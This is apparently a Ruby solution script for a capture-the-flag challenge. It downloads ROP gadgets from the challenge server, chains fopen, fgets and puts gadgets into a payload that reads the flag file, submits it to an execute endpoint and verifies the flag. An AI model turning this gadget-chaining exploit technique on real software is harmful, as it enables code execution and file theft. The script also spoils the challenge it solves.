require 'httparty'
require 'yaml'
require 'json'

require './libronsolve.rb'

# Load gadgets
GADGETS = HTTParty.get("#{ get_url() }gadgets").parsed_response.map { |e| [e['name'].gsub(/\(.*/, ''), e] }.to_h

PAYLOAD = [
  GADGETS['write_flag_to_file'],
  GADGETS['mov rdi, rax / ret'],
  GADGETS['get_letter_r'],
  GADGETS['mov rsi, rax / ret'],
  GADGETS['fopen'],
  GADGETS['mov rdx, rax / ret'],
  GADGETS['get_writable_memory'],
  GADGETS['mov rdi, rax / ret'],
  GADGETS['pop rsi / ret'],
  'ff00000000000000',
  GADGETS['fgets'],
  GADGETS['get_writable_memory'],
  GADGETS['mov rdi, rax / ret'],
  GADGETS['puts'],
  GADGETS['pop rdi / ret'],
  '0000000000000000',
  GADGETS['exit'],
].map { |e| (e['hex'] ? e['hex'] : e) }.join

out = HTTParty.post(
  "#{ get_url() }execute",
  :body => {
    'code' => PAYLOAD,
  }.to_json,
  :headers => {
    'Content-Type' => 'application/json',
  },
)

pp out.parsed_response

if out.parsed_response['error']
  puts "Something went wrong: #{ out.parsed_response['error'] }"
  exit 1
else
  check_flag(out.parsed_response['stdout'], terminate: true)
end
